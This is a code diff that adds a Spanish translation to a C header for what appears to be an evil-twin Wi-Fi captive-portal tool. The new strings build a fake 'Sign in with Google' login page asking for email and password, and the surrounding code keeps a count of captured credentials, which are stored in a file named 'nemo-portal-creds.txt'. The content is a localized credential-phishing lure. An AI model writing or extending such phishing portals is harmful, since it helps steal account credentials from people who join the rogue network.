@@ -7,8 +7,8 @@
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 
-#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
-#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
+#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)  && defined(LANGUAGE_ES_ES)
+#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR or LANGUAGE_ES_ES"
 #endif
 
 #if defined(LANGUAGE_EN_US)
@@ -47,7 +47,18 @@
 #define LOGIN_BUTTON "Suivant"
 #define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
 #define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
+#elif defined(LANGUAGE_ES_ES)
+#define LOGIN_TITLE "Iniciar sesión"
+#define LOGIN_SUBTITLE "Iniciar sesión con Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Correo electrónico"
+#define LOGIN_PASSWORD_PLACEHOLDER "Contraseña"
+#define LOGIN_MESSAGE "Por favor, inicia sesión para navegar de forma segura."
+#define LOGIN_BUTTON "Siguiente"
+#define LOGIN_AFTER_MESSAGE "Por favor espera unos minutos. Pronto podrás acceder a Internet."
+#define TYPE_SSID_TEXT "La longitud del SSID debe estar entre 2 y 32\nInválido: ?,$,\",[,\\,],+\n\nEscribe el SSID\nPresiona Enter para Confirmar\n\n"
 #endif
+
+
 
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
